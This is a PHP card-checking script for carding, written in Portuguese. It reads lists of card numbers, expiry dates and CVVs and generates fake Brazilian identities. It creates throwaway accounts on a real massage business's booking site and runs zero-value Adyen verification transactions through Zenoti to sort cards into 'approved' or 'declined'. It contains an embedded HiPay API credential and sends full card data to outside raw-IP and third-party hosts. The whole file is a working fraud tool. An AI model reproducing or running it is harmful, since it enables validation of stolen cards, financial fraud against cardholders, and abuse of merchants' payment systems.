<?php
error_reporting(0);
set_time_limit(60);
date_default_timezone_set('America/Sao_Paulo');

function getStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function separar($lista){
	preg_match_all('/[\d]{12,16}[\|»\s\/]{1,4}[\d]{1,2}[\|»\s\/]{1,4}[\d]{2,4}[\|»\s\/]{1,4}[\d]{3,4}/', $lista, $matches);
	$counter = 0;
	$contents = "";
	foreach ($matches[0] as $value) {
		$string = str_replace([' ','/','»'], '|', $value);
		$patterns = ['/(\|\|\|\|)/', '/(\|\|\|)/', '/(\|\|)/',];
		$replacements = ['|','|','|'];
		$string = preg_replace($patterns, $replacements, $string);
		$contents .= $string;
		$counter++;
		}
		return $contents;
}

$lista = separar($_GET["lista"]);

if(empty($lista)){
	$json = array("retorno" => "Erro",
	"emoji" => "‼️",
	"message" => "Insira um cartão para teste.");
	$js = json_encode($json, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
	exit($js);
}

$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];
if(strlen($mes) == 1){$mes = "0".$mes;};
if(strlen($ano) == 2){$ano = "20".$ano;};
$anoDois = substr($ano, -2);
$bin = substr($cc, 0, 6);
$data = $mes."/".$ano;

$inicio = microtime(true);

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "https://secure2-vault.hipay-tpp.com/rest/v2/token/create.json");
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array("Authorization: Basic OTQ2NTIzNjQuYXBpLmhpcGF5LXRwcC5jb206Y29rU09IN3JPY1lNQ0RKZGVydEs2ZGIz"));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'card_number='.$cc.'&card_holder=Ivo+kisner+junior&card_expiry_month=12&card_expiry_year=2026&cvc=000&generate_request_id=0&multi_use=1');
 $pay = curl_exec($ch);
 $token = json_decode($pay, true)["token"];
 $banco = json_decode($pay, true)["issuer"] ?? "INDEFINIDO";
 $pais = json_decode($pay, true)["country"] ?? "INDEFINIDO";
 $tipo = json_decode($pay, true)["card_type"] ?? "INDEFINIDO";
  $nivel = json_decode($pay, true)["card_category"] ?? "INDEFINIDO";
 $bandeira = json_decode($pay, true)["brand"] ?? "INDEFINIDO";

$data_expirada = false;
$mes_atual = date('m');
$ano_atual = date('Y');
if($ano < $ano_atual || ($ano == $ano_atual && $mes < $mes_atual)){
    $data_expirada = true;
}

if($data_expirada){
    $json = array("retorno" => "Reprovada",
    "emoji" => "❌",
    "message" => "Data do cartão expirada.",
    "valor" => "???",
    "gateway" => "???",
    "cartao" => array("numero" => $cc,
    "vencimento" => $data,
    "cvv" => $cvv,
    "formatada" => $cc."|".$mes."|".$ano."|".$cvv),
    "bin" => array("numero" => $bin,
    "banco" => $banco,
    "pais" => $pais,
    "tipo" => $tipo,
    "nivel" => $nivel,
    "bandeira" => $bandeira));
    $js = json_encode($json, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
	exit($js);
}else{}

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://www.4devs.com.br/ferramentas_online.php');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=N&idade='.rand(18, 70).'&cep_estado=&txt_qtde=1&cep_cidade=');
$hd = array();
$hd[] = 'Accept: */*';
$hd[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$hd[] = 'Content-Type: application/x-www-form-urlencoded';
$hd[] = 'Host: www.4devs.com.br';
$hd[] = 'Origin: https://www.4devs.com.br';
$hd[] = 'Referer: https://www.4devs.com.br/gerador_de_pessoas';
$hd[] = 'User-Agent: '.$userAgent;
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
$gen = curl_exec($ch);
$dados = json_decode($gen, true)[0];
curl_close($ch);
$nome = $dados["nome"] ?? "Anderson Mende Mendonca";
$idade = $dados["idade"] ?? rand(18, 70);
$cpf = $dados["cpf"] ?? "04087592677";
$rg = $dados["rg"] ?? "784365";
$nascimento = $dados["data_nasc"] ?? "30/12/1980";
$sexo = $dados["sexo"] ?? "Masculino";
$mae = $dados["mae"] ?? "Solange Mendes Mendonca";
$pai = $dados["pai"] ?? "Alberto Mendes Mendonca";
$cep = $dados["cep"] ?? "89874000";
$rua = $dados["endereco"] ?? "Av. Anitta Garibaldi";
number = $dados["numero"] ?? rand(1000, 9999);
$bairro = $dados["bairro"] ?? "Centro";
$cidade = $dados["cidade"] ?? "Maravilha";
$estado = $dados["estado"] ?? "SC";
$celular = $dados["celular"] ?? "49991".rand(100000, 999999);
$email = getStr($gen, '"email":"','@').rand(0000,9999).'@gmail.com';
$what = array( 'ä','ã','à','á','â','ê','ë','è','é','ï','ì','í','ö','õ','ò','ó','ô','ü','ù','ú','û','À','Á','É','Í','Ó','Ú','ñ','Ñ','ç','Ç');
$by = array( 'a','a','a','a','a','e','e','e','e','i','i','i','o','o','o','o','o','u','u','u','u','A','A','E','I','O','U','n','n','c','C');
$nome = str_replace($what, $by, $nome);
$mae = str_replace($what, $by, $mae);
$pai = str_replace($what, $by, $pai);
$namee = explode(' ', $nome)[0];
$sobrenome = explode(' ', $nome)[1];

$url = 'http://150.136.81.119:5000/@metaofc/dados/v1';
$data = json_decode(file_get_contents($url), true);
$cpf = $data['cpf'];
$name = $data['name'];
$namee = explode(' ', $name)[0];
$sobrenome = explode(' ', $name)[1];
$email = uniqid() . "@gmail.com";

sleep(2);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.thenowmassage.com/api/v1/users');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_HEADER, true);
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
  "user": {
    "email": "'.$email.'",
    "first_name": "'.$namee.'",
    "last_name": "'.$sobrenome.'",
    "boutique_id": "fort-lauderdale",
    "password": "91915024Aa@",
    "mobile_phone": "49991'.rand(10000, 99999).'"
  }
}');
$hd = array();
$hd[] = 'Host: api.thenowmassage.com';
$hd[] = 'Accept: application/json, text/plain, */*';
$hd[] = 'Accept-Language: pt-BR,pt;q=0.9';
$hd[] = 'Content-Type: application/json';
$hd[] = 'Origin: https://members.thenowmassage.com';
$hd[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1';
$hd[] = 'Referer: https://members.thenowmassage.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
$create = curl_exec($ch);
$accessToken = getStr($create, 'authorization: Bearer ', '=')."=";
$accessToken = trim($accessToken);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.thenowmassage.com/api/v1/user/payment_profiles');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
  "platform": "web",
  "redirect_uri": "https://members.thenowmassage.com/add-card-success"
}');
$hd = array();
$hd[] = 'Host: api.thenowmassage.com';
$hd[] = 'Accept: application/json, text/plain, */*';
$hd[] = 'Authorization: Bearer '.$accessToken;
$hd[] = 'Accept-Language: pt-BR,pt;q=0.9';
$hd[] = 'Content-Type: application/json';
$hd[] = 'Origin: https://members.thenowmassage.com';
$hd[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1';
$hd[] = 'Referer: https://members.thenowmassage.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
$tokens = curl_exec($ch);
$url = json_decode($tokens, true)["data"]["hosted_payment_uri"];
$token = getStr($tokens, 'TokenFK=', '\u0026Mode');
$id = getStr($tokens, 'SubscriberId=', '\u0026');
$signature = getStr($tokens, 'signature=', '"');
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$hd = array();
$hd[] = 'Host: thenow.zenoti.com';
$hd[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
$hd[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1';
$hd[] = 'Referer: https://members.thenowmassage.com/';
$hd[] = 'Accept-Language: pt-BR,pt;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
$web = curl_exec($ch);
$webtoken = getStr($web, "globalWebApiToken = '", "'");
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://apiamrs04.zenoti.com/v1/payments/tokens/'.$token.'/billing_address');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
  "processor_id": "Adyen",
  "address_info": {
    "City": "Chicago",
    "Country": "29",
    "Zipcode": "10001",
    "State": "-1",
    "Address1": "Boston 67",
    "Address2": "New Center 67"
  }
}');
$hd = array();
$hd[] = 'Authorization: Bearer '.$webtoken;
$hd[] = 'application_version: 1';
$hd[] = 'application_name: web';
$hd[] = 'x-languagecode: en-US';
$hd[] = 'accept: application/json, text/javascript, */*; q=0.01';
$hd[] = 'content-type: application/json; charset=UTF-8';
$hd[] = 'origin: https://thenow.zenoti.com';
$hd[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1';
$hd[] = 'referer: https://thenow.zenoti.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
$endereco = curl_exec($ch);
curl_close($ch);

$chave = '10001|D5AE1F89EE111A47DE65E2AB87C5A66243B994BE7449A0748062C5B8940F27583ACFB48E8398DD8A2180BB1E1136B93CC47A7258312FCAD16AE9308970E7DB5DD326F53D0023E47D5A399C343EA4E212AC9C369830B2381F3C44B951D8B9A1E7DE1FF03D78EF1C136D569F2C6CE1D5FF89E999D540D9953D985A01652570CC5B64F96F8A6D0A7749D2F256746A20CFFA4F5BE2BEC4ABC11572F5FF0DBF556C38FA742206A8A05589116A27BB5F455CF3E2F769F74B1D0B7E28EFB5C0DB1A71267EA4B7F3A9025428045772C638573B79DCCFED84DB36085C78E6ECA22A50842EC8A327EE4C7309B9F5C80E4B97343468E08AE047B4170BD4D4C8203AE2352A49';

$ch = curl_init();
    curl_setopt_array($ch, array(
    CURLOPT_URL => 'http://15.228.160.230:8080/encrypt',
    CURLOPT_ENCODING => "gzip",
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
    CURLOPT_HTTPHEADER => array(
      "Content-Type: application/json"
    ),
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => '{"adyen_key": "'.$chave.'", "adyen_version": "_0_1_8", "card": "'.$cc.'", "cvv": "'.$cvv.'", "month": "'.$mes.'", "year": "'.$ano.'"}'
    ));
    $r0 = curl_exec($ch);
    curl_close($ch);
$data = json_decode($r0, true);

$card = str_replace("adyenjs_0_1_8$", "adyenan0_1_1$", $data["data"]["card"]);
$mes = str_replace("adyenjs_0_1_8$", "adyenan0_1_1$", $data["data"]["month"]);
$ano = str_replace("adyenjs_0_1_8$", "adyenan0_1_1$", $data["data"]["year"]);
$cvv = str_replace("adyenjs_0_1_8$", "adyenan0_1_1$", $data["data"]["cvv"]);

if($bandeira == "MASTERCARD"){ $brand = "mc"; }elseif($bandeira == "AMERICAN EXPRESS"){ $brand = "amex"; }else{ $brand = strtolower($bandeira); }

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://thenow.zenoti.com/OnlinePayments/AdyentHPP.aspx/ProcessTransaction');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_POSTFIELDS, '{
//   "processorId": "Adyen",
//   "subscriberId": "'.$id.'",
//   "transactionSource": "WebStore",
//   "paymentRequest": {
//     "paymentMethod": {
//       "type": "scheme",
//       "holderName": "'.$namee.' '.$sobrenome.'",
//       "encryptedCardNumber": "'.$card.'",
//       "encryptedExpiryMonth": "'.$mes.'",
//       "encryptedExpiryYear": "'.$ano.'",
//       "encryptedSecurityCode": "'.$cvv.'",
//       "brand": "'.$brand.'"
//     },
//     "type": "scheme",
//     "reference": "'.$token.'",
//     "BrowserInformation": {
//       "acceptHeader": "*/*",
//       "colorDepth": 24,
//       "language": "pt-BR",
//       "javaEnabled": false,
//       "screenHeight": 896,
//       "screenWidth": 414,
//       "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1",
//       "timeZoneOffset": 180
//     },
//     "shopperLocale": "en-US",
//     "signature": "'.$signature.'",
//     "channel": "iOS",
//     "amount": {
//       "currency": "USD",
//       "value": "0"
//     },
//     "brand": "'.$brand.'",
//     "FirstRecurringCharge": "0"
//   }
// }');

curl_setopt($ch, CURLOPT_POSTFIELDS, '{
  "processorId": "Adyen",
  "subscriberId": "'.$id.'",
  "transactionSource": "WebStore",
  "paymentRequest": {
    "paymentMethod": {
      "type": "scheme",
      "holderName": "'.$name.'",
      "encryptedCardNumber": "'.$card.'",
      "encryptedExpiryMonth": "'.$mes.'",
      "encryptedExpiryYear": "'.$ano.'",
      "encryptedSecurityCode": "'.$cvv.'",
      "brand": "'.$brand.'"
    },
    "type": "scheme",
    "reference": "'.$token.'",
    "BrowserInformation": {
      "acceptHeader": "*/*",
      "colorDepth": 24,
      "language": "pt-BR",
      "javaEnabled": false,
      "screenHeight": 896,
      "screenWidth": 414,
      "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1",
      "timeZoneOffset": 180
    },
    "shopperLocale": "en-US",
    "signature": "'.$signature.'",
    "channel": "iOS",
    "amount": {
      "currency": "USD",
      "value": "0"
    },
    "brand": "'.$brand.'",
    "FirstRecurringCharge": "0"
  }
}');

$hd = array();
$hd[] = 'Host: thenow.zenoti.com';
$hd[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$hd[] = 'X-LanguageCode: en-US';
$hd[] = 'X-Requested-With: XMLHttpRequest';
$hd[] = 'Accept-Language: pt-BR,pt;q=0.9';
$hd[] = 'Content-Type: application/json; charset=utf-8';
$hd[] = 'Origin: https://thenow.zenoti.com';
$hd[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1';
$hd[] = 'Referer: https://thenow.zenoti.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $hd);
$resp = curl_exec($ch);
curl_close($ch);

// $decode = json_decode($resp, true)["d"];
// $js = json_decode($decode, true);
// $status = $js["Message"];
// $status = stripslashes($status);
// $code = $js["ErrorMessageId"] ?? "999";
// curl_close($ch);

////////////////////////////////////////////////////////////////////////////////////

$data = json_decode($resp, true);
$d_data = json_decode($data['d'], true);
$messagetotal = $d_data['Message'];
preg_match('/"([^"]+)"/', $messagetotal, $matches);
$message = $matches[1] ?? '';
$fim = microtime(true);
$tempoTotal = $fim - $inicio;
$tempoFormatado = number_format($tempoTotal, 2);

////////////////////////////////////////////////////////////////////////////////////

if(strpos($resp, 'N7 : Decline for CVV2 failure')) {
$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin='.$cc.'');

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning"></span><br>');

}

if(strpos($resp, 'Payment account created successfully')) {
$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin='.$cc.'');

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning"></span><br>');

}

if(strpos($resp, '85 : No reason to decline a request for account number verification, address verification, CVV2 verification, or a credit voucher or merchandise return')) {
$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin='.$cc.'');

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning"></span><br>');

}

if(strpos($resp, '00 : Approved or completed successfully')) {
$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin='.$cc.'');

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning"></span><br>');

}

if(strpos($resp, '88 : Cryptographic failure')) {
$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin='.$cc.'');

die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning"></span><br>');

}

elseif(strpos($resp, 'Due to authentication needs')) {

$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin='.$cc.'');

// die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cartão com VBV/MSC </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning"></span><br>');

die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão com VBV/MSC </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning"></span><br>');

}elseif(strpos($resp, '"Success\":false,\"Message\":\"')) {
$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin='.$cc.'');

// die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> '.$message.' </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning">@pladixoficial</span><br>');

die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$message.' </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning"></span><br>');

}else{
$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin='.$cc.'');

die('<span class="text-danger">Error</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Erro interno... </span> ➔ ('.$tempoFormatado.'s) ➔ <span class="text-warning"></span><br>');

}

if($status == "Payment account created successfully"){
    $json = array("retorno" => "Aprovada",
    "emoji" => "✅",
    "message" => "Payment account created successfully",
    "valor" => "R$0,00",
    "gateway" => "Adyen OAuth",
    "cartao" => array("numero" => $cc,
    "vencimento" => $data,
    "cvv" => $cvv,
    "formatada" => $cc."|".$mes."|".$ano."|".$cvv),
    "bin" => array("numero" => $bin,
    "banco" => $banco,
    "pais" => $pais,
    "tipo" => $tipo,
    "nivel" => $nivel,
    "bandeira" => $bandeira));
    $js = json_encode($json, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
    $status = "Live";
}elseif($status == 'seu retorno aqui'){
    $json = array("retorno" => "Aprovada",
    "emoji" => "✅",
    "message" => "Payment account created successfully [CVV]",
    "valor" => "R$0,00",
    "gateway" => "Adyen OAuth",
    "cartao" => array("numero" => $cc,
    "vencimento" => $data,
    "cvv" => $cvv,
    "formatada" => $cc."|".$mes."|".$ano."|".$cvv),
    "bin" => array("numero" => $bin,
    "banco" => $banco,
    "pais" => $pais,
    "tipo" => $tipo,
    "nivel" => $nivel,
    "bandeira" => $bandeira));
    $js = json_encode($json, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
    $status = "Live";
}elseif($status == 'The issuer bank has declined the transaction with reason "88 : Cryptographic failure". Please reach out to the bank for further clarification.'){
    $json = array("retorno" => "Aprovada",
    "emoji" => "✅",
    "message" => "Payment account created successfully [CVV]",
    "valor" => "R$0,00",
    "gateway" => "Adyen OAuth",
    "cartao" => array("numero" => $cc,
    "vencimento" => $data,
    "cvv" => $cvv,
    "formatada" => $cc."|".$mes."|".$ano."|".$cvv),
    "bin" => array("numero" => $bin,
    "banco" => $banco,
    "pais" => $pais,
    "tipo" => $tipo,
    "nivel" => $nivel,
    "bandeira" => $bandeira));
    $js = json_encode($json, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
    $status = "Live";
}elseif($status == 'Failed to add the card due to an incorrect billing address. Please update the postal code and try again. If the issue persists, please reach out to your bank for further assistance.'){
    $json = array("retorno" => "Aprovada",
    "emoji" => "✅",
    "message" => "Payment account created successfully",
    "valor" => "R$0,00",
    "gateway" => "Adyen OAuth",
    "cartao" => array("numero" => $cc,
    "vencimento" => $data,
    "cvv" => $cvv,
    "formatada" => $cc."|".$mes."|".$ano."|".$cvv),
    "bin" => array("numero" => $bin,
    "banco" => $banco,
    "pais" => $pais,
    "tipo" => $tipo,
    "nivel" => $nivel,
    "bandeira" => $bandeira));
    $js = json_encode($json, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
    $status = "Live";
}elseif($status == "The transaction request is invalid. Please initiate a new transaction."){
    $json = array("retorno" => "Erro",
    "emoji" => "‼️",
    "message" => $status,
    "valor" => "R$0,00",
    "gateway" => "Adyen OAuth",
    "cartao" => array("numero" => $cc,
    "vencimento" => $data,
    "cvv" => $cvv,
    "formatada" => $cc."|".$mes."|".$ano."|".$cvv),
    "bin" => array("numero" => $bin,
    "banco" => $banco,
    "pais" => $pais,
    "tipo" => $tipo,
    "nivel" => $nivel,
    "bandeira" => $bandeira));
    $js = json_encode($json, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
    $status = "Erro";
}else{
    $status = str_replace('\"', '"', $status);
    $message = $status." [".$code."]";
    $json = array("retorno" => "Reprovada",
    "emoji" => "❌",
    "message" => $message,
    "valor" => "R$0,00",
    "gateway" => "Adyen OAuth",
    "cartao" => array("numero" => $cc,
    "vencimento" => $data,
    "cvv" => $cvv,
    "formatada" => $cc."|".$mes."|".$ano."|".$cvv),
    "bin" => array("numero" => $bin,
    "banco" => $banco,
    "pais" => $pais,
    "tipo" => $tipo,
    "nivel" => $nivel,
    "bandeira" => $bandeira));
    $js = json_encode($json, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
    $status = "Die";
}
// exit($js);

?>